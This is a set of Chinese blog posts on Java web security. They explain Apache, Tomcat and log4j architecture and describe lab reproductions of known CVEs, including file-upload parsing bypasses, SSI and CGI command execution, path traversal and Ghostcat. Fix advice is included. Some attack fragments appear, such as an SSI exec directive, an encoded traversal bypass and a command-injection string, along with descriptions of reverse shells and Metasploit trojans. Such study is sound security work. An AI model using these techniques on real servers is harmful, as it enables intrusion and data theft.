[{"title":"java安全-apache","date":"2024-02-12T15:21:34.000Z","url":"/2024/02/12/java%E5%AE%89%E5%85%A8-apache/","tags":[["java安全","/tags/java%E5%AE%89%E5%85%A8/"]],"categories":[["undefined",""]],"content":"java安全-apache什么是apacheApache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一 单次web服务访问流程 Apache的目录结构 bin——-存放常用的命令工具，例如httpd cgi-bin—存放Linux下常用的命令，例如xxx.sh conf——Linux的配置相关文件，例如httpd.conf error—–错误记录 htdocs—-放网站源码 icons—–网站图标 logs——日志 manual—-手册 modules—扩展模块 apcahe架构Apache 处理请求的过程 URI Translation阶段：将请求的URL映射到本地文件系统，mod_alias模块就是在这个阶段工作 Header Parsing阶段：解析header头部，mod_setenvif在这个阶段工作 Access Control阶段：按照配置文件设定的策略对用户进行认证，并设定用户名区域，模块可以在这阶段实现认证方法。 Authorization阶段：根据配置文件检查是否允许认证过的用户执行请求的操作，模块可以在这阶段实现用户权限管理的方法 MIME Type Checking阶段 ：根据请求资源的MIME类型的相关规则，将文件交由相应的处理模块。 Fix Up 阶段：模块在内容生成器之前，运行必要的处理流程 Response阶段 ：生成响应报文。 Logging阶段 ：在响应客户端后记录事务 CleanUp阶段 ：清除请求后遗留的环境，如文件、目录的处理或者Socket的关闭等。 Apache 生命周期 启动阶段：Apache解析配置文件（如http.conf以及Include指令设定的配置文件等），模块加载(例如mod_php.so,mod_perl.so等)和系统资源初始化（例如日志文件、共享内存段等）工作。在这个阶段，Apache为了获得系统资源最大的使用权限，将以特权用户root（X系统）或超级管理员administrator(Windows系统)完成启动。 运行阶段：在这个阶段，Apache为了获得系统资源最大的使用权限，将以特权用户root（X系统）或超级管理员administrator(Windows系统)完成启动。分11个阶段处理用户的请求。 Apache 的两种工作模式1.什么是MPMMPM（Multi-Processing Modules，多路处理模块）是Apache的核心组件之一，Apache通过MPM来使用操作系统的资源，对进程和线程池进行管理。Apache为了能够获得更好的运行性能，针对不同的平台 (Unix&#x2F;Linux、Window)提供了不同的MPM，用户可以根据实际情况进行选择，其中最常使用的MPM有 prefork和worker两种。 2.Prefork 工作原理：Prefork是非线程、预生成进程型MPM，会预先启动一些子进程，每个子进程一个时间只能处理一个请求，并且会根据并发请求数量动态生成更多子进程 配置参数： 3.worker Workder是线程化、多进程的MPM，每个进程可以生成多个线程，每个线程处理一个请求；不需要启用太多的子进程,每个进程能够拥有的线程数量是固定的。服务器会根据负载情况增加或减少进程数量。一个单独的控制进程(父进程)负责子进程的建立。每个子进程能够建立ThreadsPerChild数量的服务线程和一个监听线程，该监听线程监听接入请求并将其传递给服务线程处理和应答。 配置参数： 4.Prefork和Worker的比较 prefork方式速度要稍高于worker，然而它需要的cpu和memory资源也稍多于woker。 prefork的无线程设计在某些情况下将比worker更有优势：它可以使用那些没有处理好线程安全的第三方模块，并且对于那些线程调试困难的平台而言，它也更容易调试一些。 在一个高流量的HTTP服务器上，Worker MPM是个比较好的选择，因为Worker MPM的内存使用比Prefork MPM要低得多。  apache安全Apache换行解析漏洞影响版本：Apache 2.4.0~2.4.29 影响说明：绕过服务器策略，上传webshell 环境说明：PHP5.5 、 Apache2.4.10 环境搭建：此次环境使用docker环境搭建，环境采用地址Vulhub，环境文件有3个 Dockerfile(apache环境) docker-compose.yml（compose文件，在此环境中意义不大） index.php（源文件缺少前台源码，已补全） 执行构建环境命令如下（启动后在浏览器中访问） 漏洞原理 为什么叫换行解析漏洞？是因为在上传时在文件名后缀后面加了0x0a（换行），需要注意的是3.PHP是我抓完包后手动加上的，因为后台php代码用的是$_POST[‘name’]方式获取的filename，例如如下截图 为什么加上0x0a就能绕过了呢？先看下index.php的代码 后台是通过黑名单方式过滤了php后缀的文件，根据最开始的知识，什么样的文件算是php文件呢？在&lt;FilesMatch .php$&gt;有定义，这句话的意思是以.php结尾的文件都算php文件，在正则中表示匹配输入字符串的结尾位置。如果设置了RegExp对象的Multiline属性，则也匹配 ‘\\n’ 或 ‘\\r’。恰好，我们在文件末尾加了0x0a(\\n)，所以被匹配成功了。讲到这里有两个概念需要讲清楚：0x0a与0x0d、正则表达式的m修饰符 0x0d、\\r、CR这三者代表是回车，是同一个东西，回车的作用只是移动光标至该行的起始位置； 0x0a、\\n、CL这三者代表换行，是同一个东西，换行至下一行行首起始位置；由上述可知，0x0a才是到下一行，所以在绕过时0x0d不起作用，你也可以在burp抓包时替换十六进制进行观察。 m修饰符规定正则表达式可以执行多行匹配，m修饰符也就是RegExp对象的Multiline属性。下面举个例子： 由于未采用多行匹配，以上是匹配不出来的，尽管他第一行以an结尾，如果正则改为&#x2F;an$&#x2F;m即可匹配。以上是apache的换行解析漏洞的原理，但也不能称之为漏洞，因为这只是Apache的特性，只是开发或者运维人员没有使用到位。 漏洞复现接下来通过实验的方式复现整个利用过程，首先先确认环境中的配置文件是否是&lt;FilesMatch .php$&gt;，路径为&#x2F;etc&#x2F;apache2&#x2F;conf-available&#x2F;docker-php.conf，该路径取决于apache2的目录，在搭建环境的时候不同apache版本路径可能不同，在Linux下的apache目录下执行grep -rn “FilesMatch” * 即可搜索到。（在FilesMatch中的定义是将.php为后缀的文件解析为PHP，如果将其改为.(php|html)$的话，html中的php也会被解析。）按照正常的漏洞利用步骤将其复现0x01 抓包／改包准备工作：将浏览器的代理打开、将burpsuit打开开启抓包。访问漏洞页面可以看到 点击submit进行上传，burp可以抓到 上图中最下面标红的地方是index.php代码中获取文件名的位置，但现在为空，需要填写上phpinfo.php1，后缀加1的目的是占位，下一步将1改为0x0a，点击上面红色箭头指向的Hex，将包修改为以下内容： 改完后将数据包给服务器，此时在浏览器中访问便可以看到phpinfo的界面，说明利用成功。 在Windows下的表现将漏洞代码复制到windows的环境中，进行访问、抓包（和文章中在Linux的方法一样），最终会出现以下问题： 根据上图可以发现，move_uploaded_file函数已经被执行了，说明我们绕过了黑名单的检测，只不过在windows创建文件的时候由于结尾是换行符，windows不允许，所以创建失败了。 index.php源码 Apache多后缀解析漏洞影响版本：使用module模式与php结合的所有版本 apache存在未知扩展名解析漏洞，使用fastcig模式与php结合的所有版本apache不存在此漏洞。 影响说明：绕过服务器策略，上传webshell 环境说明：PHP7 、 任意版本的使用module模式与php结合的apache 漏洞原理：什么是多后缀解析？我们来看个例子，假设访问index.php.abc，这个就是多后缀解析，Apache在特定的配置下，会将其解析为php文件。这样可以绕过后台的后缀检测，达到上传webshell的目的。那为什么会产生多后缀解析？哪个配置引起的？答案是： 上面两个配置都可以实现解析文件名中包含.php后缀的文件，apache对文件后缀名的识别是从后向前进行匹配的，以单个.作为分隔符。当遇到不认识的后缀时继续往前，直到识别，若都不识别就不做处理。在&#x2F;etc&#x2F;mime.types中有定义哪些后缀是apache识别的。关于Apache多后缀的解释，可以看官方文档。apache支持php有多种模式，常见的有module、cgi、fastcgi等，此漏洞存在于module模式。 漏洞复现复现过程非常简单，将webshell后缀名改为上传即可，如果程序验证必须要图片文件，可以修改为xxx.php.png。效果截图： windows下效果相同，不再赘述。 Apache SSI远程命令执行漏洞影响版本：Apache全版本（支持SSI与CGI） 影响说明：绕过服务器策略，上传webshell 环境说明：PHP7.1 、 Apache2.4.25 环境搭建：此次环境使用docker环境搭建，环境采用地址Vulhub，环境文件有2个 docker-compose.yml upload.php 执行构建环境命令如下（启动后在浏览器中访问） 漏洞原理SSI（server-side includes）:是放置在HTML页面中的指令，它可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。以上是定义采用在Apache官网对SSI的定义，说白了就是可以在HTML中加入特定的指令，也可以引入其他的页面。开启SSI需要单独配置Apache，可以参考SSI配置。SSI可以完成查看时间、文件修改时间、CGI程序执行结果、执行系统命令、连接数据库等操作，功能非常强大。我们要利用的就是SSI执行系统命令的功能，正常的一个包含SSI指令的文件，可以如下内容： 文件名保存为test.shtml，这个后缀取决于Apache的配置，默认是此后缀。当后台对扩展名校验不严格时，可以上传此类型文件，达到执行命令，获取webshell的目的。执行效果： 上传webshell： 反弹shell： Apache多后缀解析漏洞（apache_parsing_vulnerability）漏洞介绍apache httpd支持一个文件多个后缀，windows对于多后缀的识别是看最后一个“.”之后的后缀名。apache对于多后缀文件的识别是从后往前识别，最后一个后缀不能被识别时，会往前识别 漏洞复现 直接上传.php文件发现，会被拦截 上传多后缀，成功上传 .jpg文件解析成.php文件 Apache换行解析漏洞（CVE-2017-15715）漏洞介绍apache的2.4.0~2.4.29在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略如果通过$_FILES[&#39;file&#39;][&#39;name&#39;]获取文件名的话，会把\\x0a自动去除 漏洞复现 php文件上传失败 加上0a进行 可以解析php Apache HTTP SSRF漏洞（CVE-2021-40438）漏洞搭建vulhub&#x2F;httpd&#x2F;CVE-2021-40438docker-compose builddocker-compose up -d 漏洞介绍Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.48及以前的版本中，mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞。 漏洞复现poc 复现成功 Apache HTTP 路径穿越漏洞（CVE-2021-41773）漏洞搭建vulhub&#x2F;httpd&#x2F;CVE-2021-41773docker-compose builddocker-compose up -d 漏洞介绍在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响： 版本等于2.4.49 穿越的目录允许被访问（默认情况下是不允许的） 攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令 漏洞复现使用如下CURL命令来发送Payload（注意其中的/icons/必须是一个存在且可访问的目录）： 在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令： └─# cat README.zh-cn.md Apache HTTP 路径穿越漏洞（CVE-2021-42013）漏洞搭建vulhub&#x2F;httpd&#x2F;CVE-2021-42013docker-compose builddocker-compose up -d 漏洞介绍 Apache官方在2.4.50版本中对2.4.49版本中出现的目录穿越漏洞CVE-2021-41773进行了修复，但这个修复是不完整的，CVE-2021-42013是对补丁的绕过。 攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令 这个漏洞可以影响Apache HTTP Server 2.4.49以及2.4.50两个版本 漏洞复现但我们可以使用.%%32%65进行绕过（注意其中的/icons/必须是一个存在且可访问的目录）： 在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令： Apache SSI 远程命令执行漏洞漏洞搭建vulhub&#x2F;httpd&#x2F;ssi-rcedocker-compose builddocker-compose up -d 漏洞介绍在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用&lt;!--#exec cmd=&quot;id&quot; --&gt;语法执行任意命令。 漏洞复现 1 2 "},{"title":"java安全-tomcat","date":"2024-02-11T07:42:25.000Z","url":"/2024/02/11/java%E5%AE%89%E5%85%A8-tomcat/","tags":[["java安全s","/tags/java%E5%AE%89%E5%85%A8s/"]],"categories":[["undefined",""]],"content":"java安全-tomcat什么是tomcatTomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器，实现了对Servlet和JavaServer Page（JSP）的支持。由于Tomcat本身也内含了HTTP服务器，因此也可以视作单独的Web服务器。 默认端口：8080 简单来说，Tomcat可以看成是Web服务器+Servlet容器，如下图 Tomcat能够通过Connector组件接收并解析HTTP请求，然后将一个ServletRequest对象发送给Container处理。容器处理完之后会将响应封装成ServletRespone返回给Connector，然后Connector再将ServletRespone解析为HTTP响应文本格式发送给客户端，至此Tomcat就完成了一次网络通信。 tomcat架构 Tomcat架构图 可以看到Tomcat Server大致可以分为三个组件，Service、Connector、Container Service其中一个Tomcat Server可以包含多个Service，比如Tomcat默认的Service服务Catalina。每一个Service都是独立的，他们共享一个JVM以及系统类库，并且一个Service负责维护多个Connector和一个Container。 ConnectorConnector用于连接Service和Container，解析客户端的请求并转发到Container，以及转发来自Container的响应。每一种不同的Connector都可以处理不同的请求协议，包括HTTP&#x2F;1.1、HTTP&#x2F;2、AJP等等。 ContainerTomcat的Container包含四种子容器：Engine、Host、Context和Wrapper，在Tomcat源码中我们可以清晰地看到各容器之间的继承关系 其中，一个Container对应一个Engine，一个Engine可以包含多个Host，一个Host可以包含多个Context，Context又包含多个Wrapper，各子容器的功能如下 Engine可以看成是容器对外提供功能的入口，每个Engine是Host的集合，用于管理各个Host。 Host可以看成一个虚拟主机，一个Tomcat可以支持多个虚拟主机。 Context又叫做上下文容器，我们可以将其看成一个Web应用，每个Host里面可以运行多个Web应用。同一个Host里面不同的Context，其contextPath必须不同，默认Context的contextPath为空格(“”)或斜杠(&#x2F;)。 Wrapper是对Servlet的抽象和包装，每个Context可以有多个Wrapper，用于支持不同的Servlet每个Wrapper实例表示一个具体的Servlet定义，Wrapper主要负责管理 Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收。 可以用一张图来表示请求在Container中的解析过程 以上的映射信息通过通过Mapper组件来关联。Mapper组件保存了Web应用的配置信息，容器组件与访问路径的映射关系等。 tomcat启动过程    JavaWeb三大组件ServletServlet是用来处理客户端请求的动态资源，当Tomcat接收到来自客户端的请求时，会将其解析成RequestServlet对象并发送到对应的Servlet上进行处理。 Servlet的生命周期Servlet的生命周期分为如下五个阶段 加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例 初始化：当Servlet被实例化后，Tomcat会调用init()方法初始化这个对象 处理服务：当浏览器访问Servlet的时候，Servlet 会调用service()方法处理请求 销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用destroy()方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁 卸载：当Servlet调用完destroy()方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用init()方法进行初始化操作 只要访问Servlet，service()就会被调用。init()只有第一次访问Servlet的时候才会被调用。 destroy()只有在Tomcat关闭的时候才会被调用。因此我们主要的业务逻辑代码是写在service()函数中的。 Servlet使用示例想要编写一个自己的Servlet，就必须要继承Servlet接口并实现如下五个方法 但每次需要编写Servlet的时候都要重写五个方法，这样未免太繁琐。因此Tomcat已经帮我们封装好了两个类，分别是GenericServlet类和HttpServlet类。 GenericServlet抽象类实现了 Servlet 接口，并对 Servlet 接口中除service()方法外的其它四个方法进行了简单实现。如果我们通过继承GenericServlet类创建来Servlet，只需要重写service()方法即可。但正如其名，GenericServlet抽象类是一个通用的Servlet类，并不是针对某种应用场景而设计的，因此我们在处理HTTP请求的时候需要手动实现对HTTP请求的解析和封装。 HttpServlet是GenericServlet的子类，它在GenericServlet的基础上专门针对HTTP协议进行了处理。其针对每一种HTTP请求都设置了一种处理方法。当我们在使用HttpServlet类的时候，只需要根据HTTP请求类型重写相应的处理方法即可 下面我就以HttpServlet为例，编写一个自己的Servlet 这里我们使用注解来注册Servlet 当然我们也可以通过手动配置web.xml文件来注册Servlet，这种方式虽然繁琐，但是便于管理各Servlet。 配置Tomcat，添加好相应的war包 访问，结果如下 ServletConfig和ServletContextServletConfig当Servlet容器初始化一个Servlet时，会为这个Servlet创建一个ServletConfig对象，并将 ServletConfig 对象作为参数传递给Servlet。ServletConfig对象封装了Servlet的一些独有参数信息，因此一个Servlet只能对应一个ServletConfig。 下面是ServletConfig的使用示例 ServletContextServlet 容器启动时，会为每个 Web 应用（webapps 下的每个目录都是一个 Web 应用）创建一个唯一的 ServletContext 对象，该对象一般被称为“Servlet 上下文”。 由于一个Web应用可以包含多个Servlet，因此ServletContext可以看作是一个Web应用中各Servlet的共享资源。不同 Servlet 之间可以通过ServletContext对象实现数据通讯，因此ServletContext对象也被称为Context域对象。 ServletContext 对象的生命周期从 Servlet 容器启动时开始，到容器关闭或应用被卸载时结束。 通过ServletContext可以获取Web应用中一些共享的资源。下面我们使用ServletContext来获取上下文初始化参数 首先在web.xml中配置一个上下文初始化参数 FilterFilter用于拦截用户请求以及服务端的响应，能够在拦截之后对请求和响应做出相应的修改。Filter不是Servlet，不能直接访问，它能够对于Web应用中的资源（Servlet、JSP、静态页面等）做出拦截，从而实现一些相应的功能。下面是Filter在Server中的调用流程图 这种调用流程类似于设计模式中的“责任链模式”，对于不符合要求的资源进行拦截，而符合要求的资源使用FilterChain.doFilter()放行。下面是一个简单的Filter Servlet示例，这里我们同样使用注解方式进行配置 Hello_Servlet.java Hello_Filter1.java Hello_Filter2.java 运行结果如下 Filter的生命周期Filter的生命周期和Servlet一样，Filter的创建和销毁也是由WEB服务器负责。 初始化阶段：init(FilterConfig)，初始化方法，只会在web应用程序启动时调用一次。 拦截和过滤阶段：doFilter(ServletRequest, ServletResponse, FilterChain)，完成实际的过滤操作。当客户请求访问与过滤器关联的URL的时候，Servlet过滤器将先执行doFilter方法。FilterChain参数用于访问后续过滤器 销毁阶段：destory()，销毁Filter，只会在当web应用移除或服务器停止时才调用一次来卸载Filter对象 FilterChain我们知道，一个Servlet可以注册多个Filter，Web容器会将注册的多个Filter组合成一个“Filter链”，并按照一定的顺序依次执行各Filter的doFilter()方法。 FilterChain就是这样一个接口，其doFIiter()方法用于将本Filter处理完的Servlet资源交给下一个Filter处理。 Filter执行顺序Filter的注册方式不同，Filter的执行顺序也有所不同 基于注解配置：按照类名的字符串比较规则比较，值小的先执行 使用web.xml配置：根据对应的Mapping的顺序组织，谁定义在上边谁就在前 FilterConfig和Servlet类似，由于Filter也有可能访问Servlet，所以Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。 FilterConfig接口则用于定义FilterConfig对象应该对外提供的方法，以便在 Filter的doFilter()方法中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中的一些初始化参数。 ListenerListener是一个实现了特定接口的Java程序，用于监听一个方法或者属性，当被监听的方法被调用或者属性改变时，就会自动执行某个方法。 相关概念下面有几个与Listener相关的概念 事件：某个方法被调用，或者属性的改变 事件源：被监听的对象（如ServletContext、requset、方法等） 监听器：用于监听事件源，当发生事件时会触发监听器 监听器的分类监听器一共有如下8种 事件源 监听器 描述 ServletContext ServletContextListener 用于监听 ServletContext 对象的创建与销毁过程 HttpSession HttpSessionListener 用于监听 HttpSession 对象的创建和销毁过程 ServletRequest ServletRequestListener 用于监听 ServletRequest 对象的创建和销毁过程 ServletContext ServletContextAttributeListener 用于监听 ServletContext 对象的属性新增、移除和替换 HttpSession HttpSessionAttributeListener 用于监听 HttpSession 对象的属性新增、移除和替换 ServletRequest ServletRequestAttributeListener 用于监听 HttpServletRequest 对象的属性新增、移除和替换 HttpSession HttpSessionBindingListener 用于监听 JavaBean 对象绑定到 HttpSession 对象和从 HttpSession 对象解绑的事件 HttpSession HttpSessionActivationListener 用于监听 HttpSession 中对象活化和钝化的过程 按照监听的对象不同可以划分为三类 ServletContextListener HttpSessionListener ServletRequestListener ServletContextListener使用示例这里我们以ServletContextListener为例，创建一个用于监听ServletContext对象的Listener，这里我仍使用注解配置 在启动Tomcat服务器的时候，ServletContext对象被创建，同时触发我们设置的ServletContextListener.contextInitialized()方法 当停止Tomcat服务器时，ServletContext对象被销毁，会触发ServletContextListener.contextDestroyed()方法 三者的加载顺序三者的加载顺序为**Listener-&gt;Filter-&gt;Servlet**。 在org.apache.catalina.core.StandardContext类的startInternal()方法中，首先调用了listenerStart()，接着是filterStart()，最后是loadOnStartup()。这三处调用触发了Listener、Filter、Servlet的构造加载。 tomcat安全tomcat关键文件 server.xml：配置tomcat启动的端口号、host主机、Context等 web.xml文件：部署描述文件，这个web.xml中描述了一些默认的servlet，部署每个webapp时，都会调用这个文件，配置该web应用的默认servlet tomcat-users.xml：tomcat的用户密码与权限。 Tomcat 任意文件写入（CVE-2017-12615）影响范围：Apache Tomcat 7.0.0 - 7.0.81（默认配置） 复现环境：Tomcat&#x2F;8.5.19 漏洞原理：漏洞的产生是由于配置不当（非默认配置），将配置文件（conf&#x2F;web.xml）中的readonly设置为了false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀，不过对于不同平台有多种绕过方法 1）vulhub复现 成功上传txt！ 2）本地环境复现 写入！ 可以看到成功上传txt文件！ 尝试上传jsp文件：但是直接上传jsp文件是不被允许的！！ Tomcat 远程代码执行（CVE-2019-0232）1）漏洞简介影响范围： 影响系统： Windows 复现环境：9.0.17 Tomcat的CGI_Servlet组件默认是关闭的，在 conf&#x2F;web.xml 中找到注释的CGIServlet部分，去掉注释，并配置enableCmdLineArguments和executable，开始操作！ 2）漏洞底层环境复现详解首先进行CGI相关的配置，在 conf&#x2F;web.xml 中启用CGIServlet： 这里主要的设置是 enableCmdLineArguments 和 executable 两个选项！ 同样在 conf&#x2F;web.xml 中启用cgi的servlet-mapping： 最后修改 conf&#x2F;context.xml 的 添加 privileged&#x3D;”true”属性，否则会没有权限： 配置目录文件：然后在C:\\tomcat9\\webapps\\ROOT\\WEB-INF下创建 cgi-bin目录，并在该目录下创建一个dayu.bat的文件填写任意内容即可！！ 可看到成功任意代码执行！ 3）漏洞原理-java代码审计漏洞相关的代码在tomcat\\java\\org\\apache\\catalina\\servlets\\CGIServlet.java中，CGIServlet提供了一个cgi的调用接口，在启用enableCmdLineArguments参数时，会根据RFC 3875来从Url参数中生成命令行参数，并把参数传递至Java的 Runtime 执行。 这个漏洞是因为Runtime.getRuntime().exec在Windows中和Linux中底层实现不同导致的。 下面以一个简单的case来说明这个问题，在Windows下创建dayu.bat： 并执行如下的Java代码: 在Windows下会输出 arg 和 dir 命令运行后的结果。同样的，用类似的脚本在Linux环境下测试： 此时的输出为: 导致这种输出的原因是在JDK的实现中Runtime.getRuntime().exec实际调用了ProcessBuilder，而后ProcessBuilder调用ProcessImpl使用系统调用 vfork ，把所有参数直接传递至 execve。 用strace -F -e vfork,execve java Main跟踪可以看到上面的Java代码在Linux中调用为: 而如果跟踪类似的PHP代码system(&#39;a.sh dayu &amp; dir&#39;); ，得到的结果为: 所以Java的Runtime.getRuntime().exec在CGI调用这种情况下很难有命令注入。而Windows中创建进程使用的是CreateProcess，会将参数合并成字符串，作为lpComandLine传入CreateProcess。程序启动后调用GetCommandLine获取参数，并调用CommandLineToArgvW传至 argv。在Windows中，当CreateProcess中的参数为 bat 文件或是 cmd 文件时，会调用 cmd.exe , 故最后会变成cmd.exe /c &quot;dayu.bat &amp; dir&quot;，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞。 除此之外，Windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过， 例如dir &quot;\\&quot;&amp;whoami&quot;在Linux中是安全的，而在Windows会执行命令。 这是因为Windows在处理命令行参数时，会将 “ 中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 “ ，但是对 “ 的处理有误。同样用dayu.bat做测试，可以发现这里只输出了 \\ 。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检查才能避免漏洞出现。 修复方式： 开发者在 patch 中增加了cmdLineArgumentsDecoded参数，这个参数用来校验传入的命令行参数，如果传入的命令行参数不符合规定的模式，则不执行。 校验写在setupFromRequest函数中： 不通过时，会将CGIEnvironment的 valid 参数设为 false ，在之后的处理函数中会直接跳过执行。 Tomcat AJP文件包含漏洞分析（CVE-2020-1938）1）漏洞简介由于Tomcat在处理AJP请求时，未对请求做任何验证，通过设置AJP连接器封装的request对象的属性，导致产生任意文件读取漏洞和代码执行漏洞！ CVE-2020-1938 又名GhostCat，之前引起了一场风雨，由长亭科技安全研究员发现的存在于Tomcat中的安全漏洞，由于Tomcat AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector可以读取或包含Tomcat上所有webapp目录下的任意文件，例如可以读取webapp配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。 影响版本：Apache Tomcat 9.x &lt; 9.0.31Apache Tomcat 8.x &lt; 8.5.51Apache Tomcat 7.x &lt; 7.0.100Apache Tomcat 6.x 影响说明：读取webapp下的所有文件 2）漏洞源码分析漏洞成因是两个配置文件导致： Tomcat在部署时有两个重要的配置文件conf/server.xml、conf/web.xml。前者定义了tomcat启动时涉及的组件属性，其中包含两个connector（用于处理请求的组件）： 如果开启状态下，tomcat启动后会监听8080、8009端口，它们分别负责接受http、ajp协议的数据。后者则和普通的java Web应用一样，用来定义servlet，这里是tomcat内建的几个servlet： 就像注解中描述的default servlet用来处理所有未被匹配到其他servlet的uri请求，jsp servlet用来处理以.jsp、.jspxz做后缀名的uri请求，这俩都随tomcat一起启动。 3）tomcat结构简介详解tomcat的整体架构如上图所示，一个tomcat就是一个server，其中可以包含多个service（这里指是一个抽象的逻辑层）。而每个service由Connector、Container、Jsp引擎、日志等组件构成，与此次漏洞相关的组件主要是前两者。 Connector是用来接受客户端的请求，请求中的数据包在被Connector解析后就会由Container处理。这个过程大致如下图：Container中可以包含多个Host（虚拟主机，同Apache中定义），一个Host对应一个域名，因此Tomcat也可以配置多域名；每个Host又可以有多个Context，每个context其实就是一个web应用；而context下又有多个Wrapper，wrapper和servlet一一对应，只是它封装了一些管理servlet的函数。更进一步，客户端请求就交由servlet进入应用级的处理逻辑。 参考文章详细介绍，后期深入讲解： 4）漏洞复现-理解原理（1）开启vulhub利用vulnhub开启即可 成功开启！ （2）简单了解运行过程 从图中可以看出，Tomcat最顶层的容器是Server，其中包含至少一个或者多个Service，一个Service有多个Connector和一个Container组成。这两个组件的作用为：1、Connector用于处理连接相关的事情，并提供Socket与Request和Response相关的转化;2、Container用于封装和管理Servlet，以及具体处理Request请求；Tomcat默认的 conf&#x2F;server.xml 中配置了2个 Connector，一个为8080的对外提供的HTTP协议(1.1版本)端口，默认监听地址: 0.0.0.0:8080，另外一个就是默认的8009 AJP协议(1.3版本)端口，默认监听地址为:0.0.0.0:8009，两个端口默认均监听在外网ip。 此次漏洞产生的位置便是8009的AJP协议，此处使用公开的利用脚本进行测试，可以看到能读取web.xml文件。 5）漏洞复现-利用POC攻击下载地址： 该脚本运行在python2环境下！安装好环境执行正常！ 成功读取/WEB-INF/web.xml文件的源码！ 进入ROOT目录写入简单信息！ 可看到都是可以读取到源码的！！文件读取漏洞！！ 6）漏洞复现-文件包含RCE该漏洞可以任意文件类型解析为jsp，从而达到任意命令执行的效果。但漏洞需要配合文件上传漏洞才可利用，假设目标服务器已经有了一个shell.png，里面内容是执行任意命令，可以执行以下命令得到命令执行结果 在线bash payload生成： 最终payload为txt文件： 准备上传到目标服务器！ docker命令成功将文本传到本地！ kali开启监听： 成功执行12（文件包含RCE）上线！ 该漏洞可以和爆破war上传联动！ 7）MSF-Java上线msfvenom生成木马： 将木马shell上传到ROOT目录下： 开启MSF： 使用RCE执行shell.txt： 成功上线到MSF进行横向即可！ 8）修复建议1、将Tomcat立即升级到9.0.31、8.5.51或7.0.100版本进行修复。2、禁用AJP协议 具体方法:编辑 &#x2F;conf&#x2F;server.xml，找到如下行： 将此行注释掉（也可删掉该行）： 3、配置secret来设置AJP协议的认证凭证。 例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值): "},{"title":"java安全-log4j_log4j2","date":"2024-02-10T13:46:16.000Z","url":"/2024/02/10/java%E5%AE%89%E5%85%A8-log4j-log4j2/","tags":[["java安全","/tags/java%E5%AE%89%E5%85%A8/"]],"categories":[["undefined",""]],"content":"java安全-log4j,log4j2什么是log4jApache Log4j是一个基于Java的日志记录工具. 记录程序中的错误消息和用户输入等重要信息。 Log4J 是个开源软件库，提供开发人员可自由使用的预先编写的代码。开发人员可以将 Log4J 库插入自己的应用程序，无需专门编写记录器。这种便利性是 Log4J 应用广泛的原因 最新的log4j版本，包括其完整源代码，类文件和文档，可以在找到。 log4j有三个主要组件: loggers :负责捕获日志记录信息。 appenders :负责将日志信息发布到各个首选目的地。 layouts :负责格式化不同样式的日志信息。 log4j架构log4j API遵循分层体系结构，其中每个层提供不同的对象以执行不同的任务。 这种分层架构使设计灵活，并且将来可以轻松扩展。 log4j框架有两种类型的对象。 **Core Objects:**这些是框架的强制对象。 他们需要使用框架。 **Support Objects:**这些是框架的可选对象。 它们支持核心对象以执行其他但重要的任务。 核心对象核心对象包括以下类型的对象 - 记录器对象顶层是Logger，它提供Logger对象。 Logger对象负责捕获日志记录信息，它们存储在命名空间层次结构中。 布局对象布局图层提供用于格式化不同样式的日志记录信息的对象。 它在发布日志记录信息之前为appender对象提供支持。 布局对象在以人类可读和可重用的方式发布日志记录信息方面发挥着重要作用。 Appender对象这是一个提供Appender对象的低级层。 Appender对象负责将日志记录信息发布到各种首选目标，例如数据库，文件，控制台，UNIX Syslog等。 水平对象Level对象定义任何日志记录信息的粒度和优先级。 API中定义了七个级别的日志记录:OFF，DEBUG，INFO，ERROR，WARN，FATAL和ALL。 过滤对象Filter对象用于分析日志记录信息，并进一步决定是否应记录该信息。 Appender对象可以有多个与之关联的Filter对象。 如果将日志记录信息传递给特定的Appender对象，则与该Appender关联的所有Filter对象都需要批准日志记录信息，然后才能将其发布到附加目标。 ObjectRendererObjectRenderer对象专门提供传递给日志记录框架的不同对象的String表示。 Layout对象使用此对象来准备最终的日志记录信息。 LogManager (LogManager)LogManager对象管理日志记录框架。 它负责从系统范围的配置文件或配置类中读取初始配置参数。 以下虚拟图显示了log4J框架的组件: 什么是log4j2Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件。 因为存在前身Log4j，而且都是Apache下的项目，不管是jar包名称还是package名称，看起来都很相似，导致有些人分不清自己用的是Log4j还是Log4j2。这里给出几个辨别方法： 